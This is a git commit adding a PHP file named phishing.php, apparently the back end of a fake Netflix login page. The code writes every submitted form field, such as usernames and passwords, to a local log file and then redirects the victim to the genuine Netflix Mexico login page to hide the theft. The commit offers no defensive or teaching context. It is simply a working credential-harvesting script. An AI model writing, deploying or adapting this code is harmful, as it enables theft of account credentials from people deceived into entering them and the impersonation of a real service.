d755c864096b2e3da7705cc389b39f51b7f7a21c
JuanMelendres <juan.mele97@gmail.com>
2021-02-23 10:25:16 -0600

    Update
    Signed-off-by: JuanMelendres <juan.mele97@gmail.com>

---
+++ src/phishing.php
@@ -0,0 +1,25 @@
+<?php
+
+header ('Location: https://www.netflix.com/mx/login');
+
+$handle = fopen("log.txt", "a");
+
+foreach($_POST as $variable => $value) {
+
+fwrite($handle, $variable);
+
+fwrite($handle, "=");
+
+fwrite($handle, $value);
+
+fwrite($handle, "\r\n");
+
+}
+
+fwrite($handle, "\r\n\n\n\n");
+
+fclose($handle);
+
+exit;
+
+?>
